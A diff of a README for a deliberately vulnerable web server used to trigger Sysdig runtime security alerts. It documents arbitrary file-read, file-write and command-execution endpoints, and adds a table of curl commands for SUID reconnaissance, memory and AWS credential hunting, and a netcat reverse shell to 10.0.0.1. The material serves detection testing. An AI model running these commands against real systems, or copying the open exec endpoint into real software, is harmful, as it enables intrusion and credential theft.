@@ -1,19 +1,21 @@
 # Security Playground
 
-The security playground is a HTTP web server to simulate security breaches in run time.
+The security playground is a HTTP web server that alllows you to simulate various security breaches in runtime.
 
 ## Installation
 
-Use the docker image to deploy it in your Kubernetes cluster
+Use the deployment.yaml to deploy this to your kubernetes cluster, it will deploy
+- Deployment with 1 Replica of the pod
+- LoadBalancer Service to expose the web server on port 80/HTTP
 
 ```bash
-$ kubectl apply -f k8s-deployment.yaml
+kubectl apply -f kubernetes-manifests/deployment.yaml
 ```
 
-Or run it locally in a using docker
+Or run it locally in using docker
 
 ```bash
-$ docker run --rm -p 8080:8080 ghcr.io/andrewd-sysdig/security-playground:latest
+docker run --rm -p 8080:8080 ghcr.io/andrewd-sysdig/security-playground:latest
 ```
 
 ## Usage
@@ -22,52 +24,45 @@ The HTTP API exposes three endpoints to interact with the system.
 
 ### Reading a file
 
-You can read a file using just the URL.
+You can read a file using just the URL. This will return the content of the /etc/shadow file.
 
 ```bash
-$ curl localhost:8080/etc/shadow
+curl http://<webserver>/etc/shadow
 ```
-
-This will return the content of the /etc/shadow file.
 
 ### Writing a file
 
-You can write to a file using the URL and POSTing the content.
+You can write to a file using the URL and POSTing the content. This will write to /bin/hello the hello-world string.
 
 ```bash
-$ curl -X POST localhost:8080/bin/hello -d 'content=hello-world'
+curl -X POST http://<webserver>/bin/hello -d 'content=hello-world'
 ```
-
-This will write to /bin/hello the hello-world string
 
 ### Executing a command
 
-You can execute a command using the /exec endpoint and POSTing the command.
+You can execute a command using the /exec endpoint and POSTing the command. This will capture and return the STDOUT of the command executed.
 
 ```bash
-$ curl -X POST /exec -d 'command=ls -la'
+curl -X POST http://<webserver>/exec -d 'command=ls -la'
 ```
 
-This will capture and return the STDOUT of the command executed.
+## Library of curl commands to trigger various Sysdig Events
 
-### Interactive Menu
+Set the WEBSERVERIP env variable to be the IP of your target (the pod/service)
 
-Or for some quick testing try the sec-playground-menu.sh bash script
+`export WEBSERVERIP=192.168.1.15`
 
-```bash
-$ ./sec-playground-menu.sh 
-What is the http address of your target? [http://192.168.1.15]: 
+> **Sysdig Managed Policy: Sysdig Runtime Threat Detection (Severity: High)**
 
-Select an Exploit:
-1) Read Sensitive File
-2) Write script to /tmp
-3) Exec bad script
-4) Run Port Scan
-5) Dump Environment Variables
-6) Install PSQL Tools
-7) Dump DB
-8) Exfiltrate Data
-9) Open Reverse Shell
-0) Exit
-Choose an option: 
-```
+| Sysdig Event | Curl Command   |
+|---|---|
+| Reconnaissance attempt to find SUID binaries | `curl -X POST http://$WEBSERVERIP/exec -d 'command=find / -perm -u=s -type f 2>/dev/null'` |
+| Dump memory for credentials | `curl -X POST http://$WEBSERVERIP/exec -d 'command=grep passwd /proc/1/mem'` |
+| Find AWS Credentials | `curl -X POST http://$WEBSERVERIP/exec -d 'command=grep aws_access_key_id /tmp/'` |
+| Netcat Remote Code Execution in Contianer | `curl -X POST http://$WEBSERVERIP/exec -d 'command=nc -c bash 10.0.0.1 4242'` |
+
+> **Sysdig Managed Policy: Sysdig Runtime Notable Events (Severity: Medium)**
+
+| Sysdig Event | Curl Command   |
+|---|---|
+| Read sensitive file untrusted | `curl http://security-playground-aks-ds-dskb-nonprod-aue.azr.cmltd.net.au/etc/shadow` |
